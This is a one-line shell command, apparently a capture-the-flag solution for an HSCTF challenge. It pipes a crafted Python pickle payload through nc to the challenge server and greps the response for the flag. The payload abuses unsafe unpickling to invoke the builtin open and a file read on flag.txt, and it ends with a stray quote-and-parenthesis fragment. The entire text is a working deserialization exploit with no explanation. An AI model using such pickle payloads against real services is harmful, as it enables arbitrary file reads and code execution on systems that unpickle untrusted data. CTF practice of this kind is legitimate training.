xargs -0 echo -e <<EOF | nc misc.hsctf.com 9977 | grep -o hsctf{.*}
\x80\x04c__main__\npickle.io.TextIOWrapper.read\nc__main__\n__builtins__.open\nVflag.txt\n\x85R\x85R.")
EOF
